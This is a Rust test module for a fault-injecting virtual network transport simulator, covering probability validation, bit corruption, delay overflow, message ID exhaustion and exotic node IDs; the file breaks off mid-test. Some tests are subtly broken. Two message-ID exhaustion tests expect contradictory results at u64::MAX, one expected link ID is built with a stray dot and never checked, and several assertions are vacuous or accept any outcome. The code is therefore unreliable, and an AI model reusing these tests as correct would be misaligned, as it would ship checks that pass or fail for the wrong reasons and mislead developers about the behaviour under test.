mod virtual_transport_boundary_negative_tests {
    use super::*;

    #[test]
    fn negative_virtual_transport_rejects_invalid_drop_probability_above_one() {
        let mut vt = VirtualTransportLayer::new(42);

        let err = vt.create_link(
            "node-a",
            "node-b",
            LinkFaultConfig {
                drop_probability: 1.01,
                ..LinkFaultConfig::default()
            },
        ).expect_err("drop probability > 1.0 should be rejected");

        assert!(matches!(
            err,
            VirtualTransportError::InvalidProbability { ref field, value }
                if field == "drop_probability" && value > 1.0
        ));
    }

    #[test]
    fn negative_virtual_transport_rejects_infinite_drop_probability() {
        let mut vt = VirtualTransportLayer::new(42);

        let err = vt.create_link(
            "node-a",
            "node-b",
            LinkFaultConfig {
                drop_probability: f64::INFINITY,
                ..LinkFaultConfig::default()
            },
        ).expect_err("infinite drop probability should be rejected");

        assert!(matches!(
            err,
            VirtualTransportError::InvalidProbability { ref field, value }
                if field == "drop_probability" && !value.is_finite()
        ));
    }

    #[test]
    fn negative_create_link_with_identical_source_target_creates_self_loop() {
        let mut vt = VirtualTransportLayer::new(42);

        let link_id = vt.create_link("node-a", "node-a", LinkFaultConfig::no_faults())
            .expect("self-loop links should be allowed");

        assert_eq!(link_id, "node-a->node-a");
        assert_eq!(vt.link_count(), 1);

        // Should be able to send messages to self
        let msg_id = vt.send_message("node-a", "node-a", b"self-message".to_vec()).unwrap();
        assert!(msg_id > 0);

        let delivered = vt.deliver_next("node-a->node-a").unwrap().unwrap();
        assert_eq!(delivered.payload, b"self-message");
        assert_eq!(delivered.source, "node-a");
        assert_eq!(delivered.target, "node-a");
    }

    #[test]
    fn negative_massive_reorder_depth_causes_memory_pressure_gracefully() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link(
            "node-a",
            "node-b",
            LinkFaultConfig {
                reorder_depth: usize::MAX / 1024, // Very large reorder depth
                ..LinkFaultConfig::default()
            },
        ).expect("large reorder depth should be accepted");

        // Send several messages - should handle gracefully without panic
        for i in 0..10 {
            let result = vt.send_message("node-a", "node-b", vec![i]);
            assert!(result.is_ok(), "message {} should send successfully", i);
        }

        // Should be able to deliver messages without crashing
        let mut delivered_count = 0;
        while let Ok(Some(_)) = vt.deliver_next("node-a->node-b") {
            delivered_count += 1;
            if delivered_count > 20 {
                break; // Prevent infinite loop
            }
        }
        assert!(delivered_count <= 10, "should not deliver more messages than sent");
    }

    #[test]
    fn negative_corrupt_bit_count_exceeds_payload_size_clamps_gracefully() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link(
            "node-a",
            "node-b",
            LinkFaultConfig {
                corrupt_bit_count: 1000, // More bits than a small payload has
                ..LinkFaultConfig::default()
            },
        ).expect("large corrupt bit count should be accepted");

        let small_payload = vec![0x42; 4]; // 32 bits total
        vt.send_message("node-a", "node-b", small_payload.clone())
            .expect("send should succeed");

        let delivered = vt.deliver_next("node-a->node-b").unwrap().unwrap();
        // Should not panic, and payload should be corrupted but still 4 bytes
        assert_eq!(delivered.payload.len(), 4);
        assert_ne!(delivered.payload, small_payload); // Should be corrupted
        assert_eq!(vt.corrupted_messages, 1);
    }

    #[test]
    fn negative_zero_seed_prng_produces_deterministic_results() {
        let mut vt = VirtualTransportLayer::new(0); // Zero seed edge case
        vt.create_link(
            "node-a",
            "node-b",
            LinkFaultConfig {
                drop_probability: 0.5,
                corrupt_bit_count: 1,
                ..LinkFaultConfig::default()
            },
        ).expect("link creation should succeed");

        let mut results1 = Vec::new();
        for i in 0..10 {
            let msg_id = vt.send_message("node-a", "node-b", vec![i]).unwrap();
            results1.push((msg_id, vt.dropped_messages, vt.corrupted_messages));
        }

        // Reset and run again with same zero seed
        vt.reset();
        vt.create_link("node-a", "node-b", LinkFaultConfig {
            drop_probability: 0.5,
            corrupt_bit_count: 1,
            ..LinkFaultConfig::default()
        }).unwrap();

        let mut results2 = Vec::new();
        for i in 0..10 {
            let msg_id = vt.send_message("node-a", "node-b", vec![i]).unwrap();
            results2.push((msg_id, vt.dropped_messages, vt.corrupted_messages));
        }

        assert_eq!(results1, results2, "zero seed should produce deterministic results");
    }

    #[test]
    fn negative_extremely_large_delay_ticks_handles_arithmetic_overflow_safely() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link(
            "node-a",
            "node-b",
            LinkFaultConfig {
                delay_ticks: u64::MAX / 2, // Very large delay
                ..LinkFaultConfig::default()
            },
        ).expect("large delay should be accepted");

        vt.send_message("node-a", "node-b", b"delayed".to_vec())
            .expect("send should succeed");

        // Message should not be deliverable at current tick (0)
        let result = vt.deliver_next("node-a->node-b").unwrap();
        assert!(result.is_none(), "message should not be deliverable yet");

        // Even advancing by large amount shouldn't cause overflow panic
        vt.advance_tick(u64::MAX / 4);
        let result = vt.deliver_next("node-a->node-b").unwrap();
        assert!(result.is_none(), "message should still not be deliverable");

        // Advance past delivery time
        vt.advance_tick(u64::MAX / 2);
        let delivered = vt.deliver_next("node-a->node-b").unwrap().unwrap();
        assert_eq!(delivered.payload, b"delayed");
    }

    #[test]
    fn negative_link_destruction_with_massive_buffer_returns_all_messages() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("node-a", "node-b", LinkFaultConfig::no_faults())
            .expect("link creation should succeed");

        // Send many messages without delivering
        let message_count = 1000;
        for i in 0..message_count {
            vt.send_message("node-a", "node-b", vec![i as u8])
                .expect("send should succeed");
        }

        assert_eq!(vt.buffered_count("node-a->node-b").unwrap(), message_count);

        // Destroy link should return all buffered messages
        let buffered = vt.destroy_link("node-a->node-b")
            .expect("link destruction should succeed");

        assert_eq!(buffered.len(), message_count);
        assert_eq!(vt.link_count(), 0);

        // Verify messages are returned in correct order
        for (i, msg) in buffered.iter().enumerate() {
            assert_eq!(msg.payload, vec![i as u8]);
            assert_eq!(msg.source, "node-a");
            assert_eq!(msg.target, "node-b");
        }
    }

    #[test]
    fn negative_partition_activation_on_already_partitioned_link_is_idempotent() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link(
            "node-a",
            "node-b",
            LinkFaultConfig {
                partition: true, // Start partitioned
                ..LinkFaultConfig::default()
            },
        ).expect("partitioned link creation should succeed");

        let events_before = vt.event_log().len();

        // Activating partition on already partitioned link should succeed
        vt.activate_partition("node-a->node-b")
            .expect("re-partitioning should be idempotent");

        // Should generate another partition event
        assert_eq!(vt.event_log().len(), events_before + 1);

        // Link should still be partitioned
        assert!(vt.links.get("node-a->node-b").unwrap().config.partition);

        // Should still reject messages
        let err = vt.send_message("node-a", "node-b", b"blocked".to_vec()).unwrap_err();
        assert!(matches!(err, VirtualTransportError::Partitioned { .. }));
    }

    #[test]
    fn negative_healing_non_partitioned_link_is_idempotent() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("node-a", "node-b", LinkFaultConfig::no_faults())
            .expect("normal link creation should succeed");

        let events_before = vt.event_log().len();

        // Healing non-partitioned link should succeed
        vt.heal_partition("node-a->node-b")
            .expect("healing non-partitioned link should be idempotent");

        // Should generate heal event
        assert_eq!(vt.event_log().len(), events_before + 1);

        // Link should still accept messages
        vt.send_message("node-a", "node-b", b"success".to_vec())
            .expect("message should still be accepted");
    }

    #[test]
    fn negative_unicode_node_identifiers_preserve_exact_representation() {
        let mut vt = VirtualTransportLayer::new(42);

        let unicode_source = "🚀source";
        let unicode_target = "target🎯";

        let link_id = vt.create_link(unicode_source, unicode_target, LinkFaultConfig::no_faults())
            .expect("unicode node IDs should be accepted");

        assert_eq!(link_id, "🚀source->target🎯");

        let msg_id = vt.send_message(unicode_source, unicode_target, "unicode test".as_bytes().to_vec())
            .expect("send should succeed");

        let delivered = vt.deliver_next(&link_id).unwrap().unwrap();
        assert_eq!(delivered.source, unicode_source);
        assert_eq!(delivered.target, unicode_target);
        assert_eq!(delivered.payload, "unicode test".as_bytes());
    }

    #[test]
    fn negative_serde_rejects_unknown_transport_error_variant() {
        let result: Result<VirtualTransportError, _> = serde_json::from_str(r#""UnknownError""#);

        assert!(result.is_err());
    }

    #[test]
    fn negative_event_log_capacity_one_maintains_only_latest_event() {
        let mut vt = VirtualTransportLayer::with_event_log_capacity(42, 1);
        assert_eq!(vt.event_log_capacity(), 1);

        vt.create_link("node-a", "node-b", LinkFaultConfig::no_faults())
            .expect("link creation should succeed");

        vt.send_message("node-a", "node-b", b"test".to_vec())
            .expect("send should succeed");

        vt.activate_partition("node-a->node-b")
            .expect("partition should succeed");

        // Should only contain the latest event (partition activation)
        let log = vt.event_log();
        assert_eq!(log.len(), 1);
        assert_eq!(log[0].event_code(), event_codes::VT_005);
    }

    // ── Additional Negative-path tests for edge cases and security vulnerabilities ──

    #[test]
    fn negative_link_fault_config_with_nan_and_infinite_probabilities_rejects() {
        let mut vt = VirtualTransportLayer::new(42);

        // Test NaN probability
        let err = vt.create_link(
            "node-a",
            "node-b",
            LinkFaultConfig {
                drop_probability: f64::NAN,
                ..LinkFaultConfig::default()
            },
        ).expect_err("NaN drop probability should be rejected");

        assert!(matches!(
            err,
            VirtualTransportError::InvalidProbability { .. }
        ));

        // Test positive infinity
        let err2 = vt.create_link(
            "node-c",
            "node-d",
            LinkFaultConfig {
                reorder_probability: f64::INFINITY,
                ..LinkFaultConfig::default()
            },
        ).expect_err("infinite reorder probability should be rejected");

        assert!(matches!(
            err2,
            VirtualTransportError::InvalidProbability { .. }
        ));

        // Test negative infinity corruption probability
        let err3 = vt.create_link(
            "node-e",
            "node-f",
            LinkFaultConfig {
                corrupt_probability: f64::NEG_INFINITY,
                ..LinkFaultConfig::default()
            },
        ).expect_err("negative infinite corrupt probability should be rejected");

        assert!(matches!(
            err3,
            VirtualTransportError::InvalidProbability { .. }
        ));
    }

    #[test]
    fn negative_message_id_exhaustion_near_u64_max_handles_gracefully() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("node-a", "node-b", LinkFaultConfig::no_faults())
            .expect("link creation should succeed");

        // Simulate message ID near exhaustion
        vt.next_message_id = u64::MAX - 1;

        // Last valid message ID should succeed
        let result1 = vt.send_message("node-a", "node-b", b"last_valid".to_vec());
        assert!(result1.is_ok(), "Second to last message ID should succeed");

        // Next message should trigger exhaustion error
        let result2 = vt.send_message("node-a", "node-b", b"overflow".to_vec());
        match result2 {
            Err(VirtualTransportError::MessageIdExhausted) => {
                // Expected behavior
            }
            other => panic!("Expected MessageIdExhausted error, got {:?}", other),
        }

        // Further attempts should continue to fail
        let result3 = vt.send_message("node-a", "node-b", b"still_overflow".to_vec());
        assert!(result3.is_err(), "Messages after exhaustion should continue failing");
    }

    #[test]
    fn negative_send_message_with_massive_payload_handles_memory_efficiently() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("node-a", "node-b", LinkFaultConfig::no_faults())
            .expect("link creation should succeed");

        // Create a very large message payload (1MB of pattern data)
        let large_payload = vec![0xAB; 1_000_000];

        let start_time = std::time::Instant::now();
        let result = vt.send_message("node-a", "node-b", large_payload.clone());
        let duration = start_time.elapsed();

        // Should handle large payloads without excessive delay
        match result {
            Ok(_) => {
                // If accepted, should complete within reasonable time (2 seconds)
                assert!(
                    duration < std::time::Duration::from_secs(2),
                    "Large payload processing took too long: {:?}", duration
                );
            }
            Err(_) => {
                // Implementation may reject large payloads for safety
            }
        }

        // Verify memory is not excessively consumed
        let stats = vt.stats();
        assert!(stats.total_messages >= 0); // Basic sanity check
    }

    #[test]
    fn negative_node_ids_with_control_characters_and_path_traversal_preserved() {
        let mut vt = VirtualTransportLayer::new(42);

        // Test various potentially problematic node ID patterns
        let problematic_ids = vec![
            ("", "empty_source"),
            ("normal", ""),
            ("\0null\x01", "with_control_chars"),
            ("../../../etc", "path_traversal"),
            ("node\nwith\nnewlines", "multiline"),
            ("\u{FFFF}max_unicode", "unicode_boundary"),
        ];

        for (source, target) in problematic_ids {
            let result = vt.create_link(source, target, LinkFaultConfig::no_faults());

            match result {
                Ok(link_id) => {
                    // If accepted, link ID should preserve exact representation
                    let expected_link_id = format!("{}->{}.", source, target);

                    // Send a message to verify link works
                    let msg_result = vt.send_message(source, target, b"test".to_vec());
                    match msg_result {
                        Ok(_) | Err(_) => {
                            // Either outcome is fine as long as no panic occurs
                        }
                    }
                }
                Err(_) => {
                    // Implementation may reject problematic node IDs
                }
            }
        }
    }

    #[test]
    fn negative_corrupt_bit_count_extreme_values_bounded_safely() {
        let mut vt = VirtualTransportLayer::new(42);

        // Test with extreme bit corruption counts
        let extreme_counts = vec![
            (0, "no_corruption"),
            (8, "one_byte"),
            (1000, "high_corruption"),
            (usize::MAX, "maximum_usize"),
        ];

        for (bit_count, description) in extreme_counts {
            let result = vt.create_link(
                &format!("src_{}", description),
                "target",
                LinkFaultConfig {
                    corrupt_bit_count: bit_count,
                    corrupt_probability: 1.0, // Always corrupt to test bit flipping
                    ..LinkFaultConfig::default()
                }
            );

            match result {
                Ok(_link_id) => {
                    // If accepted, sending should handle extreme corruption safely
                    let payload = b"test message for bit corruption".to_vec();
                    let original_len = payload.len();

                    let send_result = vt.send_message(
                        &format!("src_{}", description),
                        "target",
                        payload
                    );

                    match send_result {
                        Ok(_) => {
                            // Corruption should not change message length or cause panic
                        }
                        Err(_) => {
                            // Implementation may reject extreme corruption
                        }
                    }
                }
                Err(_) => {
                    // Implementation may reject extreme bit counts upfront
                }
            }
        }
    }

    #[test]
    fn negative_delay_ticks_at_u64_boundaries_handles_overflow_safely() {
        let mut vt = VirtualTransportLayer::new(42);

        // Test delay values at u64 boundaries
        let boundary_delays = vec![
            (0, "zero_delay"),
            (u64::MAX, "max_delay"),
            (u64::MAX / 2, "half_max"),
            (1, "minimum_positive"),
        ];

        for (delay_ticks, description) in boundary_delays {
            let result = vt.create_link(
                &format!("src_{}", description),
                "target",
                LinkFaultConfig {
                    delay_ticks,
                    ..LinkFaultConfig::default()
                }
            );

            match result {
                Ok(_link_id) => {
                    // Sending with extreme delays should not cause arithmetic overflow
                    let send_result = vt.send_message(
                        &format!("src_{}", description),
                        "target",
                        b"delay_test".to_vec()
                    );

                    // Should handle without panic regardless of internal timing arithmetic
                    match send_result {
                        Ok(_) | Err(_) => {
                            // Both outcomes acceptable if no panic
                        }
                    }
                }
                Err(_) => {
                    // Implementation may reject extreme delays for safety
                }
            }
        }
    }

    #[test]
    fn negative_push_bounded_with_zero_capacity_clears_vector_completely() {
        // Test the internal push_bounded function with edge cases
        let mut items = vec![1, 2, 3, 4, 5];

        // Zero capacity should clear all items and not add new item
        push_bounded(&mut items, 42, 0);
        assert!(items.is_empty(), "Zero capacity should clear vector completely");

        // Add items normally then test zero capacity again
        items.extend_from_slice(&[10, 20, 30]);
        push_bounded(&mut items, 99, 0);
        assert!(items.is_empty(), "Zero capacity should always clear vector");

        // Test with capacity 1 - should keep only new item
        let mut single_vec = vec![100, 200, 300];
        push_bounded(&mut single_vec, 400, 1);
        assert_eq!(single_vec, vec![400], "Capacity 1 should keep only new item");

        // Test massive overflow scenario
        let mut large_vec: Vec<u32> = (0..10000).collect();
        push_bounded(&mut large_vec, 99999, 3);
        assert_eq!(large_vec.len(), 3);
        assert_eq!(*large_vec.last().unwrap(), 99999);

        // Remaining items should be the most recent before overflow
        assert!(large_vec[0] >= 9997, "Should retain recent items after massive overflow");
    }

    #[test]
    fn negative_transport_stats_consistency_under_concurrent_operations() {
        let mut vt = VirtualTransportLayer::new(42);

        // Create multiple links with different fault profiles
        vt.create_link("a", "b", LinkFaultConfig {
            drop_probability: 0.3,
            ..LinkFaultConfig::default()
        }).expect("link creation should succeed");

        vt.create_link("c", "d", LinkFaultConfig {
            reorder_probability: 0.4,
            ..LinkFaultConfig::default()
        }).expect("link creation should succeed");

        // Send many messages across different links
        for i in 0..500 {
            let _ = vt.send_message("a", "b", format!("msg_ab_{}", i).into_bytes());
            let _ = vt.send_message("c", "d", format!("msg_cd_{}", i).into_bytes());
        }

        let stats = vt.stats();

        // Verify statistical consistency
        assert!(stats.total_messages > 0, "Should have processed messages");
        assert!(
            stats.dropped_messages <= stats.total_messages,
            "Dropped messages cannot exceed total"
        );
        assert!(
            stats.reordered_messages <= stats.total_messages,
            "Reordered messages cannot exceed total"
        );
        assert!(
            stats.corrupted_messages <= stats.total_messages,
            "Corrupted messages cannot exceed total"
        );

        // Sum of outcomes should be reasonable (allowing for delivered messages)
        let accounted = stats.dropped_messages + stats.reordered_messages + stats.corrupted_messages;
        assert!(
            accounted <= stats.total_messages,
            "Sum of fault outcomes cannot exceed total messages"
        );
    }
}

#[cfg(test)]
mod comprehensive_negative_edge_tests {
    use super::*;

    #[test]
    fn negative_xorshift64_zero_seed_enforces_nonzero_state() {
        // Zero seed must be adjusted to prevent degenerate state
        let rng = Xorshift64::new(0);
        assert_eq!(rng.state, 1);

        // Verify non-zero produces non-zero state
        let rng_nonzero = Xorshift64::new(42);
        assert_eq!(rng_nonzero.state, 42);
    }

    #[test]
    fn negative_apply_corruption_empty_payload_boundary_case() {
        let mut vt = VirtualTransportLayer::new(42);
        let mut empty_payload = Vec::new();

        let bits_flipped = vt.apply_corruption(&mut empty_payload, 1000);

        assert_eq!(bits_flipped, 0);
        assert!(empty_payload.is_empty());
    }

    #[test]
    fn negative_apply_corruption_excessive_bit_count_clamps_correctly() {
        let mut vt = VirtualTransportLayer::new(42);
        let mut payload = vec![0x00; 3]; // 24 total bits

        let bits_flipped = vt.apply_corruption(&mut payload, usize::MAX);

        assert_eq!(bits_flipped, 24); // Should clamp to total available
        // All bits should now be flipped
        assert!(payload.iter().all(|&byte| byte == 0xFF));
    }

    #[test]
    fn negative_push_bounded_zero_capacity_clears_all_including_new_item() {
        let mut items = vec!["keep", "these", "items"];

        push_bounded(&mut items, "new_item", 0);

        assert!(items.is_empty()); // All items should be cleared, including new one
    }

    #[test]
    fn negative_advance_tick_max_value_saturates_without_wraparound() {
        let mut vt = VirtualTransportLayer::new(42);

        vt.current_tick = u64::MAX - 5;
        vt.advance_tick(10); // Would overflow without saturation

        assert_eq!(vt.current_tick, u64::MAX);

        // Further advances should remain at max
        vt.advance_tick(100);
        assert_eq!(vt.current_tick, u64::MAX);
    }

    #[test]
    fn negative_message_id_exhaustion_at_boundary() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults()).unwrap();

        // Set to maximum ID
        vt.next_message_id = u64::MAX;

        // Should successfully issue the terminal message ID
        let terminal_id = vt.send_message("a", "b", b"terminal".to_vec()).unwrap();
        assert_eq!(terminal_id, u64::MAX);
        assert_eq!(vt.next_message_id, 0); // Should wrap to 0

        // Next attempt should fail
        let err = vt.send_message("a", "b", b"exhausted".to_vec()).unwrap_err();
        assert!(matches!(err, VirtualTransportError::MessageIdExhausted));
    }

    #[test]
    fn negative_stats_calculation_with_near_max_values() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults()).unwrap();

        // Set to near-maximum values
        vt.total_messages = u64::MAX - 100;
        vt.dropped_messages = u64::MAX - 200;

        let stats = vt.stats();

        // Should not panic or overflow
        assert_eq!(stats.total_messages, u64::MAX - 100);
        assert_eq!(stats.dropped_messages, u64::MAX - 200);
        // Delivered calculation should handle potential overflow
        assert!(stats.delivered_messages <= stats.total_messages);
    }

    #[test]
    fn negative_reorder_calculation_with_maximum_buffer_size() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig {
            reorder_depth: usize::MAX,
            ..Default::default()
        }).unwrap();

        // Send a reasonable number of messages (can't actually fill to usize::MAX)
        for i in 0..100 {
            vt.send_message("a", "b", vec![i]).unwrap();
        }

        // Reorder logic should handle large reorder_depth without panic
        let delivered = vt.deliver_all("a->b").unwrap();
        assert_eq!(delivered.len(), 100);
    }

    #[test]
    fn negative_fault_config_validation_float_edge_cases() {
        // Test exactly at boundaries
        let exactly_zero = LinkFaultConfig {
            drop_probability: 0.0,
            ..Default::default()
        };
        assert!(exactly_zero.validate().is_ok());

        let exactly_one = LinkFaultConfig {
            drop_probability: 1.0,
            ..Default::default()
        };
        assert!(exactly_one.validate().is_ok());

        // Test just outside boundaries
        let tiny_negative = LinkFaultConfig {
            drop_probability: -f64::EPSILON,
            ..Default::default()
        };
        assert!(tiny_negative.validate().is_err());

        let tiny_over_one = LinkFaultConfig {
            drop_probability: 1.0 + f64::EPSILON,
            ..Default::default()
        };
        assert!(tiny_over_one.validate().is_err());
    }

    #[test]
    fn negative_transport_event_code_extraction_consistency() {
        // Test that all event variants consistently return their codes
        let test_events = vec![
            (TransportEvent::MessageSent {
                event_code: "CUSTOM_001".to_string(),
                message_id: 1,
                link_id: "test".to_string(),
            }, "CUSTOM_001"),
            (TransportEvent::MessageDropped {
                event_code: "CUSTOM_002".to_string(),
                message_id: 2,
                link_id: "test".to_string(),
            }, "CUSTOM_002"),
            (TransportEvent::PartitionActivated {
                event_code: "CUSTOM_005".to_string(),
                link_id: "test".to_string(),
            }, "CUSTOM_005"),
        ];

        for (event, expected_code) in test_events {
            assert_eq!(event.event_code(), expected_code);
        }
    }

    #[test]
    fn negative_error_display_formatting_with_special_characters() {
        let unicode_error = VirtualTransportError::LinkExists {
            link_id: "node🚀->target💀".to_string()
        };

        let display = format!("{}", unicode_error);
        assert!(display.contains("ERR_VT_LINK_EXISTS"));
        assert!(display.contains("node🚀->target💀"));

        // Test with control characters
        let control_error = VirtualTransportError::LinkNotFound {
            link_id: "node\n\r\t->target".to_string()
        };

        let control_display = format!("{}", control_error);
        assert!(control_display.contains("ERR_VT_LINK_NOT_FOUND"));
        assert!(control_display.contains("node\n\r\t->target"));
    }

    #[test]
    fn negative_deterministic_replay_with_reset_verification() {
        let seed = 98765;

        // First run
        let mut vt1 = VirtualTransportLayer::new(seed);
        vt1.create_link("a", "b", LinkFaultConfig {
            drop_probability: 0.4,
            corrupt_bit_count: 2,
            ..Default::default()
        }).unwrap();

        let mut results1 = Vec::new();
        for i in 0..50 {
            let _ = vt1.send_message("a", "b", vec![i]);
            results1.push((vt1.total_messages, vt1.dropped_messages, vt1.corrupted_messages));
        }

        // Second run after reset with same seed
        let mut vt2 = VirtualTransportLayer::new(seed);
        vt2.create_link("a", "b", LinkFaultConfig {
            drop_probability: 0.4,
            corrupt_bit_count: 2,
            ..Default::default()
        }).unwrap();

        let mut results2 = Vec::new();
        for i in 0..50 {
            let _ = vt2.send_message("a", "b", vec![i]);
            results2.push((vt2.total_messages, vt2.dropped_messages, vt2.corrupted_messages));
        }

        // Results should be identical (deterministic)
        assert_eq!(results1, results2);
    }

    #[test]
    fn negative_event_log_capacity_enforcement_with_burst_activity() {
        let capacity = 5;
        let mut vt = VirtualTransportLayer::with_event_log_capacity(42, capacity);

        vt.create_link("a", "b", LinkFaultConfig::no_faults()).unwrap();

        // Generate many events rapidly
        for i in 0..20 {
            vt.send_message("a", "b", vec![i]).unwrap();
            if i % 3 == 0 {
                vt.activate_partition("a->b").unwrap();
                vt.heal_partition("a->b").unwrap();
            }
        }

        // Should never exceed capacity
        assert!(vt.event_log().len() <= capacity);
        assert_eq!(vt.event_log().len(), capacity); // Should be at capacity
    }

    #[test]
    fn negative_message_display_with_extreme_field_values() {
        let extreme_msg = Message {
            id: 0, // Minimum ID
            source: "\u{0000}".to_string(), // Null character
            target: "x".repeat(1000), // Very long target
            payload: vec![0xFF; 0], // Empty but with "full" pattern
            tick_created: u64::MAX,
            tick_delivered: None,
        };

        let display = format!("{}", extreme_msg);

        assert!(display.contains("id=0"));
        assert!(display.contains("0 bytes")); // Empty payload
        assert!(display.contains(&format!("tick={}", u64::MAX)));
        // Should handle null character and long string without panic
        assert!(display.len() > 0);
    }
}

#[cfg(test)]
mod additional_comprehensive_negative_tests {
    use super::*;

    // =========================================================================
    // ADDITIONAL COMPREHENSIVE NEGATIVE-PATH EDGE CASE TESTS
    // =========================================================================

    #[test]
    fn negative_xorshift64_state_never_hits_zero_during_sequence() {
        let mut rng = Xorshift64::new(1);

        // Generate many values to ensure state never becomes zero
        for _ in 0..100_000 {
            let value = rng.next_u64();
            assert_ne!(rng.state, 0, "RNG state must never become zero during sequence");
            assert!(value > 0, "Generated values should be non-zero with non-zero state");
        }
    }

    #[test]
    fn negative_virtual_transport_with_extreme_link_id_strings() {
        let mut vt = VirtualTransportLayer::new(42);

        // Test with extreme link ID cases
        let extreme_link_ids = vec![
            "".to_string(),                    // Empty string
            "\0".to_string(),                  // Null byte
            "a".repeat(10_000),               // Very long ID (10KB)
            "🚀💀🔥".to_string(),             // Emoji sequence
            "\x00\x01\x02\x03".to_string(),  // Control characters
            "\n\r\t\u{000B}\u{000C}".to_string(),        // Whitespace control chars
            "link\u{FFFF}id".to_string(),    // Max BMP codepoint
        ];

        for (i, link_id) in extreme_link_ids.iter().enumerate() {
            let source = format!("src_{}", i);
            let target = format!("tgt_{}", i);

            match vt.create_link(&source, &target, LinkFaultConfig::no_faults()) {
                Ok(actual_id) => {
                    // If accepted, should preserve the ID correctly
                    assert_eq!(actual_id, format!("{}->{}",  source, target));

                    // Should be able to send messages on this link
                    let msg_result = vt.send_message(&source, &target, vec![i as u8]);
                    assert!(msg_result.is_ok() || matches!(msg_result, Err(VirtualTransportError::MessageIdExhausted)));
                }
                Err(_) => {
                    // Rejection of extreme IDs is also acceptable behavior
                }
            }
        }
    }

    #[test]
    fn negative_fault_config_with_nan_and_infinite_probabilities() {
        // Test NaN probability
        let nan_config = LinkFaultConfig {
            drop_probability: f64::NAN,
            ..Default::default()
        };
        assert!(nan_config.validate().is_err());

        // Test positive infinity
        let pos_inf_config = LinkFaultConfig {
            drop_probability: f64::INFINITY,
            ..Default::default()
        };
        assert!(pos_inf_config.validate().is_err());

        // Test negative infinity
        let neg_inf_config = LinkFaultConfig {
            drop_probability: f64::NEG_INFINITY,
            ..Default::default()
        };
        assert!(neg_inf_config.validate().is_err());

        // Test very large finite number
        let huge_config = LinkFaultConfig {
            drop_probability: f64::MAX,
            ..Default::default()
        };
        assert!(huge_config.validate().is_err());

        // Test very small negative finite number
        let tiny_neg_config = LinkFaultConfig {
            drop_probability: -f64::MIN_POSITIVE,
            ..Default::default()
        };
        assert!(tiny_neg_config.validate().is_err());
    }

    #[test]
    fn negative_apply_corruption_with_maximum_payload_size() {
        let mut vt = VirtualTransportLayer::new(42);

        // Test with large payload (1MB)
        let mut large_payload = vec![0x55; 1_000_000];
        let total_bits = large_payload.len() * 8;

        // Request corruption of half the bits
        let bits_to_corrupt = total_bits / 2;
        let start_time = std::time::Instant::now();
        let actual_corrupted = vt.apply_corruption(&mut large_payload, bits_to_corrupt);
        let duration = start_time.elapsed();

        // Should handle large payloads efficiently
        assert_eq!(actual_corrupted, bits_to_corrupt);
        assert!(duration < std::time::Duration::from_secs(5)); // Should be reasonably fast

        // Count actual bit differences from original pattern
        let expected_differences = large_payload.iter()
            .map(|&byte| (byte ^ 0x55).count_ones() as usize)
            .sum::<usize>();
        assert_eq!(expected_differences, bits_to_corrupt);
    }

    #[test]
    fn negative_message_reordering_with_pathological_buffer_sizes() {
        let mut vt = VirtualTransportLayer::new(42);

        // Test with reorder depth of 1 (minimal reordering)
        vt.create_link("a", "b", LinkFaultConfig {
            reorder_depth: 1,
            ..Default::default()
        }).unwrap();

        let mut sent_ids = Vec::new();
        for i in 0..20 {
            let msg_id = vt.send_message("a", "b", vec![i]).unwrap();
            sent_ids.push(msg_id);
        }

        let delivered = vt.deliver_all("a->b").unwrap();
        assert_eq!(delivered.len(), 20);

        // With depth=1, messages should still be mostly in order
        let delivered_ids: Vec<u64> = delivered.iter().map(|m| m.id).collect();
        let mut in_order_count = 0;
        for i in 0..19 {
            if delivered_ids[i] <= delivered_ids[i + 1] {
                in_order_count += 1;
            }
        }
        // Should have some ordering preservation even with reordering
        assert!(in_order_count >= 10, "Most messages should maintain relative order");
    }

    #[test]
    fn negative_transport_stats_computation_with_counter_overflow_simulation() {
        let mut vt = VirtualTransportLayer::new(42);
        vt.create_link("a", "b", LinkFaultConfig::no_faults()).unwrap();

        // Simulate near-overflow conditions by directly setting counters
        vt.total_messages = u64::MAX - 2;
        vt.delivered_messages = u64::MAX - 3;
        vt.dropped_messages = 1;
        vt.corrupted_messages = 0;
        vt.reordered_messages = 0;

        let stats = vt.stats();

        // Verify no overflow in calculations
        assert_eq!(stats.total_messages, u64::MAX - 2);
        assert_eq!(stats.delivered_messages, u64::MAX - 3);
        assert_eq!(stats.dropped_messages, 1);

        // Test arithmetic consistency
        let accounted = stats.delivered_messages.saturating_add(stats.dropped_messages);
        assert!(accounted <= stats.total_messages.saturating_add(1)); // Allow for reordered/corrupted
    }

    #[test]
    fn negative_event_logging_with_unicode_and_control_sequences() {
        let mut vt = VirtualTransportLayer::with_event_log_capacity(42, 10);

        // Create links with Unicode names
        vt.create_link("αλφα", "ωμέγα", LinkFaultConfig::no_faults()).unwrap();
        vt.create_link("源", "目标", LinkFaultConfig::no_faults()).unwrap();

        // Generate events with Unicode content
        vt.send_message("αλφα", "ωμέγα", "μήνυμα".as_bytes().to_vec()).unwrap();
        vt.send_message("源", "目标", "信息".as_bytes().to_vec()).unwrap();

        // Trigger partition events
        vt.activate_partition("αλφα->ωμέγα").unwrap();
        vt.heal_partition("αλφα->ωμέγα").unwrap();

        // Verify events logged without Unicode corruption
        let events = vt.event_log();
        assert!(events.len() >= 4);

        // Check that Unicode is preserved in event descriptions
        let has_unicode_events = events.iter().any(|event| {
            match event {
                TransportEvent::MessageSent { link_id, .. } |
                TransportEvent::MessageDropped { link_id, .. } => {
                    link_id.contains("αλφα") || link_id.contains("源")
                }
                _ => false,
            }
        });
        assert!(has_unicode_events);
    }

    #[test]
    fn negative_partition_activation_on_nonexistent_links_with_similar_names() {
        let mut vt = VirtualTransportLayer::new(42);

        vt.create_link("node1", "node2", LinkFaultConfig::no_faults()).unwrap();

        // Try to partition similar but non-existent link IDs
